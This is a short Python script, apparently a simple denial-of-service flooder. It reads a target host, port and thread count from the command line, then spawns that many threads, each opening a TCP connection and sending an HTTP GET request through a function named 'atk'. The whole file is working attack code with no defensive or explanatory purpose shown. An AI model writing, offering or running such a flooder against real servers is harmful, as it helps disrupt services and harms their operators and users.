import socket, threading, time, random, sys


def inputp():
   global url
   #url = str(input("url: "))
   #port = int(input("port: "))
   #count = int(input("count: "))
   url = sys.argv[1]
   port = int(sys.argv[2])
   count = int(sys.argv[3])
   return url, port, count

def atk(ip, port):
   soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   try:
     soc.connect((ip, port))
     print('connected! ')
     byt = (f'GET /{url} HTTP/1.1\nHost: {url}\n\n').encode()
     soc.send(byt)
   except socket.error:
     print(f"Error: {str(socket.error)}")

def loop1():
   atk(ip,p)

if __name__ == '__main__':
   global ip
   global c
   global p
   u, p, c = inputp()
   ip = socket.gethostbyname(u)
   atk(ip,p)
for v in range(c):
   threading.Thread(target=loop1).start()
   print(f"{v}")
